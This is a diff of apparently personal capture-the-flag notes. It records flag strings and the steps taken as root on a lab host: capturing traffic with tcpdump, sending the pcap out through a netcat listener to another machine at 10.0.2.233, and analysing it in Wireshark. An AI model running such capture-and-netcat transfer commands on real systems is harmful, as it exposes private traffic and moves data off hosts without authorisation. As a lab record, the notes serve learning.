@@ -198,6 +198,7 @@ flag{6be6ef286c041a489b9f681acdd8afebb441a9b22df584}.jpg
 flag{14ce18}
 logged in as a root to cuiteuer
 https://www.tcpdump.org/manpages/tcpdump.1.html
+cd/temp
  tcpdump -w dump.pcap
 
 send the file to my server
@@ -205,6 +206,7 @@ nc -lvnp 4242 < ./dump.pcap
 
 opend another terminal to recive the packet 
 nc -w 5 10.0.2.233 4242 >dump.pcap
+used Wireshark to analyze the dump.pcap
 flag{14ce1808aaac88fcfe4baa5d180148b026890a96002103}
 --------------------------------------------------------------------------
 
